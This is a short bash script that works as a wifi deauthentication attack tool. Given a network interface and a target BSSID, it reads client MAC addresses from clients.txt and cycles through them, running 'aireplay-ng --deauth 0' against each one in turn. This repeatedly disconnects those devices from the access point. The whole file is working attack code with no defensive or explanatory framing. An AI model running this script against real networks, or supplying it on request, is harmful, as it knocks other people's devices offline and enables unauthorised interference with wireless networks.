#!/bin/bash

declare -a clients
declare -a pids

cl_pure="clients.txt"

macrgx="^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$"

bssid="null"
iface="null"

declare -i idx

update_clients () {
    clients=($(cat $cl_pure))
    clients=(${clients[@]//${bssid}})
}

deauth_clients () {
    idx=0
    
    update_clients

    while :
    do
        ccl="${clients[${idx}]}"
        
        if [[ "$ccl" =~ $macrgx ]]
        then
            xterm -T "$ccl" -fg green -bg black -e "aireplay-ng --deauth 0 -a ${bssid} -c ${ccl} ${iface}" &> /dev/null &
            cpd=$!

            idx+=1

            if [[ "$idx" = "${#clients[@]}" ]]
            then
                idx=0
                update_clients
            fi
        
            sleep 7
            kill $cpd
        fi
    done
}

main () {
    iface=$1
    bssid=$2
    
    sleep 2.5

    deauth_clients
}

main $@